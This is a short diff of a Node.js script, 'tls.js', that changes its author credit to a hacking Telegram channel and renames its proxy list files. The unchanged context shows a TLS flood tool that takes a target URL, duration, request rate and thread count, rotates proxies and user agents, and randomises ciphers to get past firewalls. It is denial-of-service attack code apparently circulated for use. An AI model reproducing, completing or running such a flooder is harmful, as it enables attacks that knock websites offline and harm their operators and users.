@@ -1,6 +1,6 @@
 /**
  *
- * @odiyan911 tls for firewall
+ * @ANONYMOUS_PK tls for firewall
  * 
  */
 
@@ -15,7 +15,7 @@
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 5){console.log(`Mariana_web_official > Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
+ if (process.argv.length < 5){console.log(`TELEGRAM @hackingtoolx > Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
  
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
@@ -58,8 +58,8 @@
  
  const secureContext = tls.createSecureContext(secureContextOptions);
  
- var proxyFile = "proxies.txt";
- var proxyFile2 = "proxies_.txt";
+ var proxyFile = "proxy.txt";
+ var proxyFile2 = "http.txt";
  var proxies = readLines(proxyFile);
  var proxies2 = readLines(proxyFile2);
  var userAgents = readLines("ua.txt");
